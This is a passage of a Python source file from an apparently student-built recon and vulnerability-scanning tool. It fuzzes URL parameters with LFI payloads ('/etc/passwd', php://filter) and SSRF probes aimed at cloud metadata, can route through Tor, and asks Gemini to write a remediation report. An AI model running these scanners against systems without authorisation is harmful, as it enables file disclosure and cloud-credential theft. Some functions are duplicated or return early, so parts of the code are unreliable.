        # ÙˆÙ‚Øª Ø£Ø·ÙˆÙ„ Ø´ÙˆÙŠØ© (10 Ø¯Ù‚Ø§ÙŠÙ‚) Ø¹Ø´Ø§Ù† Ø¯Ù‡ ÙØ­Øµ Ø¬Ù…Ø§Ø¹ÙŠ
        subprocess.run(command, shell=True, timeout=600)

        # ÙØ­Øµ Ø§Ù„Ù†ØªØ§Ø¦Ø¬
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(colored(f"   [!!!] SSRF VULNERABILITIES FOUND!", "red", attrs=['bold']))
            print(colored(f"   Check report: {output_file}", "yellow"))

            # Ø¹Ø±Ø¶ Ø¹ÙŠÙ†Ø© Ù…Ù† Ø§Ù„Ù†ØªØ§Ø¦Ø¬
            with open(output_file, 'r') as f:
                print("   Samples:")
                for i, line in enumerate(f):
                    if i < 5:
                        print(colored(f"   â””â”€â”€ {line.strip()}", "yellow"))
                    else:
                        break
        else:
            print(colored("   [-] No SSRF found in any target.", "white"))

    except subprocess.TimeoutExpired:
        print(colored("   [-] Scan Timed out.", "white"))
    except Exception as e:
        print(colored(f"   [-] Error: {e}", "red"))

#######################################
############ Report Generator #########
def generate_json_report(domain, place):
    print(colored(f"\n[+] Generating Final JSON Report...", "cyan", attrs=['bold']))

    def parse_sqli_file(filename):
        file_path = os.path.join(place, filename)
        if not os.path.exists(file_path): return []

        results = []
        current_target = None
        current_type = None

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            for line in lines:
                line = line.strip()

                if line.startswith("Target:"):
                    if current_target is not None:
                        results.append(current_target)

                    current_target = {
                        "url": line.replace("Target:", "").strip(),
                        "payloads": []
                    }
                    current_type = None

                elif line.startswith("[*] Type:"):
                    if current_target is not None:
                        current_type = line.replace("[*] Type:", "").strip()


                elif line.startswith("[*] Payload:"):
                    if current_target is not None and current_type:
                        payload_data = line.replace("[*] Payload:", "").strip()
                        current_target["payloads"].append({
                            "type": current_type,
                            "payload": payload_data
                        })


            if current_target is not None:
                results.append(current_target)

            return results

        except Exception as e:
            print(f"Error parsing SQLi file: {e}")
            return []


    def parse_xss_file(filename):
        file_path = os.path.join(place, filename)
        if not os.path.exists(file_path): return []

        results = []
        current_target = None

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            for line in lines:
                line = line.strip()

                if line.startswith("Target:"):
                    if current_target is not None:
                        results.append(current_target)

                    current_target = {
                        "url": line.replace("Target:", "").strip(),
                        "pocs": []
                    }

                elif line.startswith("->"):
                    if current_target is not None:
                        raw_poc = line.replace("->", "").strip()

                        parts = raw_poc.split(" ", 1)
                        if len(parts) == 2:
                            current_target["pocs"].append({
                                "info": parts[0],  # [R][GET][inHTML]
                                "payload_url": parts[1]  # Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø­Ù‚ÙˆÙ†
                            })
                        else:
                            current_target["pocs"].append({"raw_poc": raw_poc})

            if current_target is not None:
                results.append(current_target)

            return results

        except Exception as e:
            print(f"Error parsing XSS file: {e}")
            return []

    def read_lines(filename):
        path = os.path.join(place, filename)
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                return [l.strip() for l in f if l.strip()]
        return []

    def count_files(dirname):
        path = os.path.join(place, dirname)
        return len(os.listdir(path)) if os.path.exists(path) else 0


    def parse_cve_file(filename):
            file_path = os.path.join(place, filename)
            if not os.path.exists(file_path): return []

            results = []
            current_target = None
            current_exploit = {}

            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()

                for line in lines:
                    line = line.strip()

                    if line.startswith("[VULN CHECK] Target:"):
                        if current_target:
                            results.append(current_target)

                        target_name = line.replace("[VULN CHECK] Target:", "").strip()
                        current_target = {
                            "software": target_name,
                            "exploits": []
                        }

                    elif line.startswith("ID:"):
                        current_exploit = {"id": line.replace("ID:", "").strip()}
                    elif line.startswith("Title:"):
                        current_exploit["title"] = line.replace("Title:", "").strip()
                    elif line.startswith("Link:"):
                        current_exploit["link"] = line.replace("Link:", "").strip()

                    elif line.startswith("---") or line.startswith("==="):
                        if current_target and current_exploit:
                            current_target["exploits"].append(current_exploit)
                            current_exploit = {}

                if current_target:
                    if current_exploit: current_target["exploits"].append(current_exploit)
                    results.append(current_target)

                return results
            except Exception as e:
                print(f"Error parsing CVE file: {e}")
                return []

    def parse_cms_file(filename):
            file_path = os.path.join(place, filename)
            if not os.path.exists(file_path): return {}

            cms_data = {
                "target": "",
                "server_info": {},
                "detected_technologies": []
            }

            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()

                for line in lines:
                    line = line.strip()

                    if line.startswith("Target:"):
                        cms_data["target"] = line.replace("Target:", "").strip()

                    # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©
                    elif line.startswith("IP"):
                        cms_data["server_info"]["ip"] = line.split(":")[-1].strip()
                    elif line.startswith("Country"):
                        cms_data["server_info"]["country"] = line.split(":")[-1].strip()
                    elif line.startswith("Title"):
                        cms_data["server_info"]["title"] = line.split(":", 1)[-1].strip()

                    elif line.startswith("Summary"):
                        raw_summary = line.split(":", 1)[-1].strip()
                        # Summary Ø¨ÙŠØ¬ÙŠ Ø´ÙƒÙ„Ù‡: PHP[5.6], HTTPServer[nginx]
                        techs = raw_summary.split(", ")
                        for tech in techs:
                            cms_data["detected_technologies"].append(tech.strip())

                return cms_data
            except Exception as e:
                print(f"Error parsing CMS file: {e}")
                return {}

    def parse_lfi_file(filename):
        """
        ØªÙ‚Ø±Ø£ Ù…Ù„Ù LFI ÙˆØªØ­ÙˆÙ„Ù‡ Ù„Ù‚Ø§Ø¦Ù…Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù†Ø¸Ù…Ø© Ù„Ù„ØªÙ‚Ø±ÙŠØ±
        """
        results = []
        file_path = os.path.join(place, filename)
        # Ø§Ù„ØªØ£ÙƒØ¯ Ø¥Ù† Ø§Ù„Ù…Ù„Ù Ù…ÙˆØ¬ÙˆØ¯ Ø£ØµÙ„Ø§Ù‹
        if not os.path.exists(file_path):
            return []

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            # Regex Ù„ÙØµÙ„ Ù†ÙˆØ¹ Ø§Ù„Ø«ØºØ±Ø© Ø¹Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
            # Ø§Ù„Ù†Ù…Ø·: [ÙˆØµÙ Ø§Ù„Ø«ØºØ±Ø©] Ø±Ø§Ø¨Ø·
            log_pattern = re.compile(r"^\[(.*?)\]\s+(http.*)$")

            for line in lines:
                line = line.strip()
                if not line: continue

                match = log_pattern.match(line)
                if match:
                    vuln_desc = match.group(1)  # Ù…Ø«Ù„Ø§: System File Access (/etc/passwd)
                    full_url = match.group(2)  # Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„ÙƒØ§Ù…Ù„

                    # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯ ÙˆØ§Ù„Ø¨Ø§Ø±Ù…ÙŠØªØ± Ø§Ù„Ù…ØµØ§Ø¨ Ø¹Ø´Ø§Ù† Ø§Ù„ØªÙ‚Ø±ÙŠØ± ÙŠÙƒÙˆÙ† Ø§Ø­ØªØ±Ø§ÙÙŠ
                    parsed_url = urlparse(full_url)
                    params = parse_qs(parsed_url.query)

                    infected_param = "unknown"
                    payload_decoded = "unknown"

                    # Ø¨Ù†Ø¯ÙˆØ± ÙÙŠ Ø§Ù„Ø¨Ø§Ø±Ù…ÙŠØªØ±Ø§Øª Ø¹Ø´Ø§Ù† Ù†Ù„Ø§Ù‚ÙŠ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯ ÙˆÙ†ÙÙƒ ØªØ´ÙÙŠØ±Ù‡
                    for key, value in params.items():
                        val = value[0]
                        decoded_val = unquote(val)
                        # Ù„Ùˆ Ù„Ù‚ÙŠÙ†Ø§ Ø¹Ù„Ø§Ù…Ø§Øª Ø§Ù„Ù€ Traversal Ø§Ùˆ etc/passwd ÙŠØ¨Ù‚Ù‰ Ø¯Ù‡ Ø§Ù„Ø¨Ø§Ø±Ù…ÙŠØªØ± Ø§Ù„Ù…ØµØ§Ø¨
                        if "../" in decoded_val or "/etc/passwd" in decoded_val or ".." in decoded_val:
                            infected_param = key
                            payload_decoded = decoded_val
                            break
                    results.append({
                        "type": "Local File Inclusion (LFI)",
                        "description": vuln_desc,
                        "url": full_url,
                        "vulnerable_parameter": infected_param,
                        "payload": payload_decoded
                    })
                    return results
        except Exception as e:
            print(f"Error parsing LFI file: {e}")
            return []

    def parse_ssrf_file(filename):
        """
        ØªØ­ÙˆÙŠÙ„ Ù†ØªØ§Ø¦Ø¬ SSRF Ù„Ù†Ø¸Ø§Ù… JSON
        """
        file_path = os.path.join(place, filename)
        results = []
        if not os.path.exists(file_path):
            return []

        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()

            log_pattern = re.compile(r"^\[(.*?)\]\s+(http.*)$")

            for line in lines:
                line = line.strip()
                match = log_pattern.match(line)
                if match:
                    vuln_desc = match.group(1)
                    full_url = match.group(2)

                    # Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯
                    parsed_url = urlparse(full_url)
                    params = parse_qs(parsed_url.query)
                    infected_param = "unknown"
                    payload = "unknown"

                    # Ø¨Ù†Ø¯ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø² Ø§Ù„Ù…Ø¹Ø±ÙˆÙØ© Ø¬ÙˆÙ‡ Ø§Ù„Ø¨Ø±Ø§Ù…ÙŠØªØ±Ø§Øª
                    for key, value in params.items():
                        val = unquote(value[0])
                        # Ù„Ùˆ Ø§Ù„Ù‚ÙŠÙ…Ø© ÙÙŠÙ‡Ø§ ip Ø§Ùˆ localhost Ø§Ùˆ 169.254
                        if "127.0.0.1" in val or "localhost" in val or "169.254" in val or "file://" in val:
                            infected_param = key
                            payload = val
                            break

                    results.append({
                        "type": "Server-Side Request Forgery (SSRF)",
                        "description": vuln_desc,
                        "url": full_url,
                        "vulnerable_parameter": infected_param,
                        "payload": payload
                    })
        except Exception as e:
            print(f"Error parsing SSRF file: {e}")

        return results
    report = {
        "scan_metadata": {
            "target_domain": domain,
            "scan_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "tool": "RecTool - DEPI Project"
        },
        "reconnaissance": {
            "subdomains_count": len(read_lines("finalSubs.txt")),
            "subdomains_list": read_lines("finalSubs.txt"),  # Ø§Ø®ØªÙŠØ§Ø±ÙŠ Ù„Ùˆ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ù…Ø´ Ø¶Ø®Ù…Ø©
            "urls_crawled_count": len(read_lines("hackrwlerurls.txt")),
            "fuzzing_targets_count": len(read_lines("Parameters.txt"))
        },
        "downloads": {
            "js_files": count_files("js_files"),
            "php_files": count_files("php_files"),
            "json_files": count_files("json_files")
        },
        "vulnerabilities": {
            "sql_injection": parse_sqli_file("vulnerable_sqli.txt"),
            "xss": parse_xss_file("vulnerable_xss.txt"),
            "lfi": parse_lfi_file("lfi_results.txt"),
            "ssrf": parse_ssrf_file("SSRF_results.txt"),
            "info_disclosure": read_lines("info_disclosure_nikto.txt"),

        },
        "technology_stack": parse_cms_file("cms_results.txt"),
        "exploits_detected": parse_cve_file("cve_exploits.txt"),
        "active_cves_verified": read_lines("cve_nuclei_active.txt")
    }


    output_path = os.path.join(place, "Final_Report.json")
    try:
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=4, ensure_ascii=False)
        print(colored(f"[+] Final JSON Report Generated: {output_path}", "green", attrs=['bold']))
        return output_path
    except Exception as e:
        print(colored(f"[-] Error saving JSON: {e}", "red"))
        return None
#######################################
############       AI   ###############
def generate_ai_report(apikey,json_data,place):
    api_key = apikey

    # Ù„Ùˆ Ù…ÙÙŠØ´ Ù…ÙØªØ§Ø­ØŒ Ø§Ø®Ø±Ø¬ Ø¨Ù‡Ø¯ÙˆØ¡
    if not api_key:
        print("[!] No Gemini API Key found. Skipping AI Analysis.")
        return

    print("[*] Generative AI is analyzing vulnerabilities...")

    try:
        genai.configure(api_key=api_key)
        model = genai.GenerativeModel('gemini-pro-latest')

        prompt = f"""
        ACT AS A SENIOR CYBERSECURITY CONSULTANT AND PENETRATION TESTER.
        
        YOUR TASK:
        Analyze the provided JSON vulnerability scan data from the tool "RecTool" (DEPI Graduation Project) and generate a world-class, comprehensive penetration test report in Markdown format.

        TARGET AUDIENCE:
        1. Executive Management (High-level risk overview).
        2. Developers & System Admins (Technical remediation and code fixes).

        REPORT STRUCTURE & REQUIREMENTS:

        1. ğŸš¨ EXECUTIVE SUMMARY
           - Provide an overall "Security Score" (0-100) based on findings.
           - Create a Markdown Table summarizing counts: [Critical, High, Medium, Low].
           - Write a short paragraph explaining the business impact (Financial loss, Reputation damage) if these are not fixed.

        2. ğŸ” DETAILED VULNERABILITY ANALYSIS (Iterate through findings)
           For each vulnerability found in the JSON:
           - **Title & Severity:** Use emojis (e.g., ğŸ”´ Critical, ğŸŸ  High).
           - **The Location:** Specific URL and Parameter.
           - **The Attack Vector:** Explain HOW the payload works in simple terms.
           - **Business Impact:** What can an attacker actually DO? (e.g., "Dump the entire database", "Access server files").

        3. ğŸ› ï¸ REMEDIATION & CODE PATCHES (THE MOST IMPORTANT PART)
           - Detect the technology stack from the URLs (e.g., if .php -> provide PHP code, if .py -> Python).
           - **Vulnerable Code Example:** Write a hypothetical snippet of how the code likely looks right now.
           - **Secure Code Patch:** Write the CORRECT, SECURE code using industry best practices (e.g., Prepared Statements for SQLi, Input Sanitization for XSS).
           
        4. ğŸ›¡ï¸ DEFENSE IN DEPTH SUGGESTIONS
           - Suggest WAF rules or server configurations (like .htaccess or Nginx config) to block these attacks globally.

        INPUT DATA:
        {json_data}

        OUTPUT FORMAT:
        - Use professional Markdown.
        - Use bolding, lists, and code blocks (` ``` `) extensively.
        - Tone: Urgent but Professional.
        - If the JSON is empty or has no vulnerabilities, write a "Certificate of Clean Health" but suggest general hardening.
        """
        response = model.generate_content(prompt)

        # Ø§Ø­ÙØ¸ Ø§Ù„Ù†ØªÙŠØ¬Ø© ÙÙŠ ÙØ§ÙŠÙ„ Ø¬Ø¯ÙŠØ¯
        with open(place+"/AI_Report.md", "w") as f:
            f.write(response.text)

        print("[+] AI Report Generated: AI_Report.md")

    except Exception as e:
        print(f"[!] AI Error: {e}")

###############################################
##############      LFI     ###################
def scan_lfi_nuclei(place, use_tor=False):
    targets_file = f"{place}/Parameters.txt"
    output_file = f"{place}/lfi.txt"

    print(colored(f"\n[+] Starting LFI Scan...", "yellow", attrs=['bold']))

    if not os.path.exists(targets_file):
        print(colored("[-] No targets found (Parameters.txt is missing).", "red"))
        return

    proxy_flag = ""
    if use_tor:
        proxy_flag = " -proxy socks5://127.0.0.1:9050"


    command = f"nuclei -l {targets_file} -tags lfi {proxy_flag} -o {output_file} -silent"

    try:
        subprocess.run(command, shell=True, timeout=300)

        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            print(colored(f"   [!!!] LFI VULNERABILITIES FOUND (Nuclei)!", "red", attrs=['bold']))

            with open(output_file, 'r') as f:
                for line in f:
                    print(colored(f"   â””â”€â”€ {line.strip()}", "yellow"))
        else:
            print(colored("   [-] No LFI found by Nuclei.", "white"))

    except subprocess.TimeoutExpired:
        print(colored("   [-] LFI Scan Timed out.", "white"))
    except Exception as e:
        print(colored(f"   [-] Error: {e}", "red"))

SIG_LINUX = "root:x:0:0"
TIMEOUT = 5
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/102.0"
}

# Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø² Ø§Ø­ØªÙŠØ§Ø·ÙŠØ© Ù„Ùˆ Ø§Ù„Ù…Ù„Ù Ø§Ù„Ø®Ø§Ø±Ø¬ÙŠ Ù…Ø´ Ù…ÙˆØ¬ÙˆØ¯
DEFAULT_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php"
]

def load_payloads_from_file(file_path):
    """
    Ø¨ØªÙ‚Ø±Ø£ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø² Ù…Ù† Ù…Ù„Ù Ø®Ø§Ø±Ø¬ÙŠ
    """
    if not file_path or not os.path.exists(file_path):
        print(colored(f"[!] Payload file '{file_path}' not found. Using default list.", "yellow"))
        return DEFAULT_PAYLOADS

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            # strip() Ø¹Ø´Ø§Ù† ÙŠØ´ÙŠÙ„ Ø§Ù„Ù…Ø³Ø§ÙØ§Øª ÙˆØ§Ù„Ø£Ø³Ø·Ø± Ø§Ù„Ø²ÙŠØ§Ø¯Ø©
            payloads = [line.strip() for line in f if line.strip()]

        print(colored(f"[*] Loaded {len(payloads)} custom payloads from file.", "cyan"))
        return payloads
    except Exception as e:
        print(colored(f"[!] Error reading payload file: {e}", "red"))
        return DEFAULT_PAYLOADS

def generate_malicious_urls(url, payloads_list):
    """
    Ø¨ØªØ§Ø®Ø¯ Ø§Ù„Ù„ÙŠÙ†Ùƒ ÙˆÙ‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø² ÙˆØªØ¹Ù…Ù„ Fuzzing
    """
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        return []

    malicious_links = []

    for param_name in query_params:
        for payload in payloads_list:
            new_params = query_params.copy()

            # [payload] Ù„Ø£Ù† Ø§Ù„Ù€ urlencode Ø¨ØªØ­ØªØ§Ø¬ Ø§Ù„Ù‚ÙŠÙ…Ø© ØªÙƒÙˆÙ† List
            new_params[param_name] = [payload]

            new_query = urlencode(new_params, doseq=True)
            new_parts = list(parsed)
            new_parts[4] = new_query
            full_malicious_url = urlunparse(new_parts)

            malicious_links.append(full_malicious_url)

    return malicious_links

def scan_single_url(target_url):
    """
    Ø§Ù„ÙØ§Ù†ÙƒØ´Ù† Ø§Ù„Ù„ÙŠ Ø¨ØªØ´ØªØºÙ„ Ø¬ÙˆÙ‡ Ø§Ù„Ù€ Thread
    """
    try:
        req = requests.get(target_url, headers=HEADERS, timeout=TIMEOUT)

        # 1. ÙØ­Øµ Ù…Ù„Ù etc/passwd
        if SIG_LINUX in req.text:
            return (target_url, "System File Access (/etc/passwd)")

        # 2. ÙØ­Øµ Base64 (Source Code Disclosure)
        if "php://filter" in target_url and len(req.text) > 100:
            # Ù†ØªØ£ÙƒØ¯ Ø¥Ù†Ù‡ Ù…Ø´ Ù…Ø¬Ø±Ø¯ Error Message
            if "<?php" in req.text or (len(req.text) % 4 == 0 and "=" in req.text[-2:]):
                return (target_url, "Potential Source Code Disclosure")

    except:
        pass

    return None

def run_lfi_scan(place, threads=20):
    """
    Ø§Ù„ÙØ§Ù†ÙƒØ´Ù† Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
    """

    output_file=f"{place}/lfi_results.txt"
    urls_file_path=f"{place}/Parameters.txt"
    current_dir = os.path.dirname(os.path.abspath(__file__))
    payloads_file_path = os.path.join(current_dir, 'WordLists', 'LFI.txt')
    print(colored(f"\n--- [ LFI Scanner Module ] ---", "yellow", attrs=['bold']))

    # 1. ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø²
    # Ù„Ùˆ Ø¨Ø¹Øª None Ù‡ÙŠØ³ØªØ®Ø¯Ù… Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠ
    current_payloads = load_payloads_from_file(payloads_file_path)

    # 2. Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ù„ÙŠÙ†ÙƒØ§Øª
    if not os.path.exists(urls_file_path):
        print(colored(f"[!] URLs file not found: {urls_file_path}", "red"))
        return

    with open(urls_file_path, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]

    # 3. ØªØ¬Ù‡ÙŠØ² Ø§Ù„Ù…Ù‡Ø§Ù…
    tasks = []
    print(colored("[*] Generating attack vectors...", "blue"))

    for url in urls:
        # Ø¨Ù†Ø¨Ø¹Øª Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø² Ù‡Ù†Ø§
        infected_links = generate_malicious_urls(url, current_payloads)
        tasks.extend(infected_links)

    if not tasks:
        print(colored("[!] No parameters found to fuzz.", "yellow"))
        return

    print(colored(f"[*] Total Requests: {len(tasks)} | Threads: {threads}", "cyan"))

    # 4. ØªØ´ØºÙŠÙ„ Ø§Ù„Ù€ Threads
    vulnerabilities = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(scan_single_url, tasks)

        for res in results:
            if res:
                vuln_url, vuln_type = res
                print(colored(f"\n[+] VULNERABILITY FOUND! ({vuln_type})", "red", attrs=['bold']))
                print(colored(f"    URL: {vuln_url}", "white"))

                vulnerabilities.append(f"[{vuln_type}] {vuln_url}")

                with open(output_file, "a") as f:
                    f.write(f"[{vuln_type}] {vuln_url}\n")

    print(colored(f"\n[+] Scan Finished. Found {len(vulnerabilities)} vulnerabilities.", "green"))
    return vulnerabilities
############################################
##############     SSRF       ##############
def load_payloads_from_file(file_path):
    """ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø² Ù…Ù† Ù…Ù„Ù Ø®Ø§Ø±Ø¬ÙŠ"""
    if not file_path or not os.path.exists(file_path):
        print(colored(f"[!] SSRF Payload file '{file_path}' not found. Using default list.", "yellow"))
        return DEFAULT_PAYLOADS

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            payloads = [line.strip() for line in f if line.strip()]
        print(colored(f"[*] Loaded {len(payloads)} custom SSRF payloads.", "cyan"))
        return payloads
    except Exception as e:
        print(colored(f"[!] Error reading payload file: {e}", "red"))
        return DEFAULT_PAYLOADS


def generate_ssrf_vectors(url, payloads_list):
    """Ø­Ù‚Ù† Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø² Ø¯Ø§Ø®Ù„ Ø§Ù„Ø¨Ø±Ø§Ù…ÙŠØªØ±Ø§Øª"""
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)

    if not query_params:
        return []

    vectors = []

    for param_name in query_params:
        for payload in payloads_list:
            new_params = query_params.copy()
            # Ø§Ø³ØªØ¨Ø¯Ø§Ù„ Ø§Ù„Ù‚ÙŠÙ…Ø© Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ Ø¨Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø®Ø¨ÙŠØ«
            new_params[param_name] = [payload]

            new_query = urlencode(new_params, doseq=True)
            new_parts = list(parsed)
            new_parts[4] = new_query
            full_url = urlunparse(new_parts)

            vectors.append(full_url)

    return vectors


def scan_single_url(target_url):
    """ÙØ­Øµ Ø§Ù„Ø±Ø§Ø¨Ø· ÙˆÙ…Ø­Ø§ÙˆÙ„Ø© Ø§ÙƒØªØ´Ø§Ù Ø§Ø³ØªØ¬Ø§Ø¨Ø© Ø§Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠ"""
    try:
        req = requests.get(target_url, headers=HEADERS, timeout=TIMEOUT, allow_redirects=False)
        content = req.text

        # 1. AWS Metadata Leak
        if "ami-id" in content or "instance-id" in content:
            if "169.254" in target_url:
                return (target_url, "SSRF (AWS Metadata Leak)")

        # 2. Local File Access (File Protocol)
        if "root:x:0:0" in content and "file://" in target_url:
            return (target_url, "SSRF (Local File Read)")

        # 3. Google Cloud Metadata
        if "computeMetadata" in target_url and "Google" in req.headers.get("Metadata-Flavor", ""):
            return (target_url, "SSRF (GCP Metadata Leak)")

        # 4. Open Ports / Internal Services (SSH Banner usually)
        if "SSH-" in content and "dict://" in target_url:
            return (target_url, "SSRF (Internal Port Scan)")

        # 5. Localhost detection (Generic)
        # Ø¯ÙŠ ØµØ¹Ø¨Ø© Ø´ÙˆÙŠØ© Ù„Ø§Ù†Ù‡Ø§ Ø¨ØªØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ Ø§Ø®ØªÙ„Ø§Ù Ø§Ù„ØµÙØ­Ø©ØŒ Ø¨Ø³ Ù…Ù…ÙƒÙ† Ù†Ø´ÙŠÙƒ Ø¹Ù„Ù‰ ÙƒÙ„Ù…Ø§Øª Ù…Ø´Ù‡ÙˆØ±Ø©
        if "localhost" in target_url or "127.0.0.1" in target_url:
            if "Apache 2 Test Page" in content or "It works!" in content:
                return (target_url, "SSRF (Localhost Access)")

    except requests.exceptions.Timeout:
        # Ø£Ø­ÙŠØ§Ù†Ø§ Ø§Ù„ØªØ§ÙŠÙ… Ø£ÙˆØª Ù…Ø¹Ù†Ø§Ù‡ Ø§Ù†Ù‡ Ø­Ø§ÙˆÙ„ ÙŠØªØµÙ„ Ø¨ IP Ø¯Ø§Ø®Ù„ÙŠ ÙˆÙ…Ø±Ø¯Ø´ØŒ Ø¯ÙŠ Ø¹Ù„Ø§Ù…Ø© Blind SSRF Ø¨Ø³ ØµØ¹Ø¨Ø© Ø§Ù„ØªØ­Ø¯ÙŠØ¯
        pass
    except:
        pass

    return None


def run_ssrf_scan(place, threads=20):
    print(colored(f"\n--- [ SSRF Scanner Module ] ---", "yellow", attrs=['bold']))
    output_file = f"{place}/SSRF_results.txt"
    urls_file_path = f"{place}/Parameters.txt"
    current_dir = os.path.dirname(os.path.abspath(__file__))
    payloads_file_path = os.path.join(current_dir, 'WordLists', 'SSRF.txt')
    # ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨Ø§ÙŠÙ„ÙˆØ¯Ø²
    current_payloads = load_payloads_from_file(payloads_file_path)

    # Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ø±ÙˆØ§Ø¨Ø·
    if not os.path.exists(urls_file_path):
        print(colored(f"[!] URLs file not found: {urls_file_path}", "red"))
        return

    with open(urls_file_path, 'r') as f:
        # ÙŠÙØ¶Ù„ Ù‡Ù†Ø§ ØªØ³ØªØ®Ø¯Ù… Ø¯Ø§Ù„Ø© smart_filter_urls Ø§Ù„Ù„ÙŠ Ø¹Ù…Ù„Ù†Ø§Ù‡Ø§ Ø§Ù„Ù…Ø±Ø© Ø§Ù„Ù„ÙŠ ÙØ§ØªØª
        urls = [line.strip() for line in f if line.strip()]

    # ØªØ¬Ù‡ÙŠØ² Ø§Ù„Ù…Ù‡Ø§Ù…
    tasks = []
    print(colored("[*] Generating SSRF vectors...", "blue"))

    for url in urls:
        vectors = generate_ssrf_vectors(url, current_payloads)
        tasks.extend(vectors)

    if not tasks:
        print(colored("[!] No parameters found to test for SSRF.", "yellow"))
        return

    print(colored(f"[*] Total Requests: {len(tasks)} | Threads: {threads}", "cyan"))

    # Ø§Ù„ØªØ´ØºÙŠÙ„
    vulnerabilities = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        results = executor.map(scan_single_url, tasks)

        for res in results:
            if res:
                vuln_url, vuln_type = res
                print(colored(f"\n[+] VULNERABILITY FOUND! ({vuln_type})", "red", attrs=['bold']))
                print(colored(f"    URL: {vuln_url}", "white"))

                vulnerabilities.append(f"[{vuln_type}] {vuln_url}")

                with open(output_file, "a") as f:
                    f.write(f"[{vuln_type}] {vuln_url}\n")

    print(colored(f"\n[+] SSRF Scan Finished. Found {len(vulnerabilities)} vulnerabilities.", "green"))
    return vulnerabilities